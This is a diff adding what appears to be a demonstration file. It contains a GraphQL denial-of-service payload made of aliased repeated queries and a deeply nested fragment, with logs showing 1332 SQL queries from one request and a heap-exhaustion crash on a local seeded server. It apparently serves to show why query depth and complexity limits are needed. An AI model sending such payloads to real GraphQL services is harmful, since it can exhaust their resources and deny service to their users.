@@ -1,0 +1,121 @@
+# Example of a malicious graphql attack
+# With just 4 users + 4 posts + 3 comments, this results in 
+# [2026-01-15T21:15:13.274Z] POST /graphql - IP: ::1 - Status: 200 - 317ms
+# SQL Queries - Users: 9, Posts: 423, Comments: 513, User: 387, Total: 1332
+# Resolve calls - Users: 9, Posts: 423, PostAuthor: 135, PostComments: 513, CommentAuthor: 252, Total: 1332
+# i.e. 1332 SQL queries for a single HTTP request, this is a DoS payload
+
+{
+  users {
+    ...getPosts
+  }
+  a : users {
+    ...getPosts
+  }
+  b : users {
+    ...getPosts
+  }
+  c : users {
+    ...getPosts
+  }
+  d : users {
+    ...getPosts
+  }
+  e : users {
+    ...getPosts
+  }
+  f : users {
+    ...getPosts
+  }
+  g : users {
+    ...getPosts
+  }
+  h : users {
+    ...getPosts
+  }
+  h : users {
+    ...getPosts
+  }
+}
+
+fragment getPosts on User{
+  name
+  id
+  posts {
+    title
+    author {
+      name
+      posts {
+        comments {
+          body
+          author {
+            posts {
+              comments {
+                body
+              }
+            }
+          }
+        }
+      }
+    }
+    comments {
+      body
+      author {
+        name
+        posts {
+          title
+          body
+          comments {
+            body
+            author {
+              posts {
+                title
+                comments {
+                  body
+                  author {
+                    posts {
+                      comments {
+                        author {
+                          posts {
+                            author {
+                              posts {
+                                author {
+                                  name
+                                  id
+                                  posts {
+                                    title
+                                    body
+                                    comments {
+                                      body
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# On running this on the server after running ./seed.js
+
+#  <--- Last few GCs --->
+# 
+# [933101:0x3817e000]   201059 ms: Scavenge (interleaved) 4037.2 (4119.7) -> 4035.8 (4139.7) MB, pooled: 0 MB, 33.17 / 0.00 ms  (average mu = 0.463, current mu = 0.272) allocation failure; 
+# [933101:0x3817e000]   205487 ms: Mark-Compact 4048.9 (4139.7) -> 4040.8 (4148.2) MB, pooled: 0 MB, 4379.57 / 0.00 ms  (average mu = 0.252, current mu = 0.060) allocation failure; scavenge might not succeed
+# 
+# 
+# <--- JS stacktrace --->
+# 
+# FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
+# ----- Native stack trace -----
